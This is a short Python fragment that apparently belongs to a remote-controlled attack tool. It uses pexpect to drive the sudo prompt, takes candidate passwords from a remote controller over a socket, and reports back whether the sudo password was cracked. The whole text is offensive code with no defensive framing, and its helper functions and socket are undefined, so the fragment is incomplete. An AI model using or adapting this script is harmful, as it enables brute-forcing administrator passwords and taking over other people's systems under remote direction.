import os
import sys
import socket
import pexpect
import subprocess

while True:
    cmd = 'echo password_cracked'
    child = pexpect.spawn(f'sudo {cmd}')
    passw = ['Password.*:','.*password.*:']
    try:
        child.expect(passw,timeout=2)
    except Exception as e:
        child.close
        cmd = run_command("sudo {}".format(cmd))
        if cmd.strip() == 'password_cracked':
            send(client_socket,'sudo_failed')
            break
    send(client_socket,'sudo_success')
    n = receive(client_socket)
    if n != 'password_list_failed':
        try:
            failure = ['.*try again.*assword.*:','.*try again.*sudo: 3 incorrect password attempts.*']
            child.sendline(n)
            i = child.expect(failure, timeout=2)
        except Exception as e:
            cmd = child.before
            if cmd.strip() == 'password_cracked':
                send(client_socket,'password_cracked')
                child.close()
                break
        send(client_socket,'password_failed')
        child.close
    else:
        break
